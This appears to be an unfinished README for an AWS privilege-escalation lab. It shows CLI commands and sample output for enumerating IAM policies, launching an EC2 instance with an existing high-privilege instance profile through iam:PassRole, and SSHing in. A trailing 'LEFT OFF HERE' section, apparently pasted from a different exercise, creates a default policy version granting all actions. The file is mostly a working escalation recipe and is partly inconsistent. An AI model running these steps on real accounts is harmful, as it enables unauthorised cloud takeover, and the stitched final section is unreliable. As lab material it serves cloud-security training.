# PrivEsc3-CreateEC2WithExistingIP

## Additional Refs:
https://docs.aws.amazon.com/emr/latest/ManagementGuide/security_iam_id-based-policy-examples-view-own-permissions.html


1. View the user's current attached policies.
 
```
aws iam list-attached-user-policies --user-name privesc3-CreateEC2WithExistingInstanceProfile-user
```

> Example: Output:
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc3-CreateEC2WithExistingInstanceProfile",
            "PolicyArn": "arn:aws:iam::[REDACTED]:policy/privesc3-CreateEC2WithExistingInstanceProfile"
        }
    ]
}

```

2. List the policy versions referencing the Policy ARN you obtained above.

```
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

> Example Output:
```
{
    "Versions": [
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2022-05-09T03:25:50+00:00"
        }
    ]
}
```

3. Get the Policy details of the specifc version.

```
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id <VERSION_ID>
```

> Example Output:
```
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:PassRole",
                        "ec2:DescribeInstances",
                        "ec2:RunInstances",
                        "ec2:CreateKeyPair",
                        "ec2:AssociateIamInstanceProfile"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T03:25:50+00:00"
    }
}
```

4. List the AWS IAM Groups

```
aws iam list-groups
```

> Example Output (Only showing 1 Group for brevity):
```
{
    "Groups": [
        {
            "Path": "/",
            "GroupName": "privesc-sre-group",
            "GroupId": "AGPATSEX3CJZMAV44NSSQ",
            "Arn": "arn:aws:iam::[REDACTED]:group/privesc-sre-group",
            "CreateDate": "2022-05-09T03:28:32+00:00"
        }
    ]
}
```

5. Attempt to view attached polices of a group

```
aws iam list-attached-group-policies --group-name privesc-sre-group
```
> Example Output:
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "privesc-sre-admin-policy",
            "PolicyArn": "arn:aws:iam::[REDACTED]:policy/privesc-sre-admin-policy"
        }
    ]
}
```

6. List the policy versions referencing the Policy ARN you obtained above.

```
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

> Example Output:
```
{
    "Versions": [
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2022-05-09T03:28:42+00:00"
        }
    ]
}
```

7.  Get the Policy details of the specifc version.

```
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id <VERSION_ID>
```

> Example Output:
```
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:*",
                        "ec2:*",
                        "s3:*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T03:28:42+00:00"
    }
}
```

THAT LOOKS PRETTY NICE.... GIMME, GIMME, GIMME!!!

8. Attempt to attach user to Higher privilege Group with option `--profile` flag

```
aws iam add-user-to-group --group-name privesc-sre-group --user-name privesc3-CreateEC2WithExistingInstanceProfile-user
```
This should fail.... THERE MUST BE ANOTHER WAY!

9.  View the current instance profiles
```
aws iam list-instance-profiles
```

> Example Output (truncated for brevity:
```
{
    "InstanceProfiles": [
        {
            "Path": "/",
            "InstanceProfileName": "privesc-high-priv-service-profile",
            "InstanceProfileId": "AIPATSEX3CJZE4UFWDORI",
            "Arn": "arn:aws:iam::245131580018:instance-profile/privesc-high-priv-service-profile",
            "CreateDate": "2022-05-09T03:30:33+00:00",
            "Roles": [
                {
                    "Path": "/",
                    "RoleName": "privesc-high-priv-service-role",
                    "RoleId": "AROATSEX3CJZPA7ZDK3BE",
                    "Arn": "arn:aws:iam::245131580018:role/privesc-high-priv-service-role",
                    "CreateDate": "2022-05-09T03:27:31+00:00",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Sid": "",
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": [
                                        "codebuild.amazonaws.com",
                                        "ec2.amazonaws.com",
                                        "glue.amazonaws.com",
                                        "elasticbeanstalk.amazonaws.com",
                                        "datapipeline.amazonaws.com",
                                        "lambda.amazonaws.com",
                                        "ecs-tasks.amazonaws.com",
                                        "eks.amazonaws.com",
                                        "sagemaker.amazonaws.com",
                                        "cloudformation.amazonaws.com"
                                    ]
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    }
                }
            ]
        }
    ]
}

10. Create a SSH key pair or import an existing one.  Ref: [Create key pair](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/create-key-pairs.html):
```
aws ec2 create-key-pair \
    --key-name my-key-pair \
    --key-type rsa \
    --query "KeyMaterial" \
    --output text > my-key-pair.pem \
    --region us-east-1
 
# Change it's permissions.  This is required by AWS.
chmod 400 my-key-pair.pem
```
    
OR import existing one:
```
aws ec2 import-key-pair --key-name id_rsa --public-key-material fileb://~/.ssh/id_rsa.pub --region us-east-1
```

11.  Create an EC2 instance with optional `--profile` flag

**TODO - Below is example, however need add explanation**

```
aws ec2 run-instances --image-id ami-0708edb40a885c6ee --instance-type t2.micro --iam-instance-profile Name=privesc-high-priv-service-profile --key-name my-key-pair --security-group-ids sg-04edcd63f405badb6 --region us-east-1
```

12. Search for and copy the instance-id from output above and run the following command to obtain the public IP address.
```
aws ec2 describe-instances --instance-id <INSTANCE_ID> --region us-east-1
```
    
13. Search for and copy the Public IP Address and then SSH into the instance using your ssh key based on which key you used earlier.

```
ssh ubuntu@<INSTANCE_PUBLIC_IP> -i my-key-pair.pem   
#OR   
ssh ubuntu@<INSTANCE_PUBLIC_IP> -i ~/.ssh/id_rsa
```

## LEFT OFF HERE

5. Create a new version of the policy, based on the new policy document, and set as default for the user.  Optionally you can add --profile flag.
```
aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document file://admin_policy.json --set-as-default
```

> Example Output:
```
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T04:52:13+00:00"
    }
}
```

6. Re-list policy versions and you should see the new version added and also set as new default.

```
aws iam list-policy-versions --policy-arn <POLICY_ARN>
```

> Example Output:
```
{
    "Versions": [
        {
            "VersionId": "v2",
            "IsDefaultVersion": true,
            "CreateDate": "2022-05-09T04:52:13+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": false,
            "CreateDate": "2022-05-09T03:28:11+00:00"
        }
    ]
}
```

7. View the details of the new version of the policy.

```
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v2
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "AllowEverything",
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2022-05-09T04:52:13+00:00"
    }
}
```
